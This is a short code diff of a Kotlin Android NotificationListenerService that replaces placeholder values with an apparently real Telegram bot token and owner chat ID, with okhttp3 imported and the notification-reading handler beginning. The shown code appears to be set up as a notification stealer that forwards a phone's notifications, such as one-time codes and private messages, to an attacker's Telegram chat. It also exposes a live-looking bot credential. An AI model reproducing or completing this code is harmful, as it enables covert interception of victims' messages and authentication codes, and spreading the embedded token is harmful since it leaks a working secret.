@@ -5,8 +5,8 @@ import android.service.notification.StatusBarNotification
 import okhttp3.*
 
 class NotificationService : NotificationListenerService() {
-    private val botToken = "TOKEN_BOT"
-    private val chatId = "ID_OWNER"
+    private val botToken = "8136858986:AAF7ZIuM97LKyjac8nxf576qZmet1nalAF4"
+    private val chatId = "7081489041"
     
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         val title = sbn.notification.extras.getString("android.title")
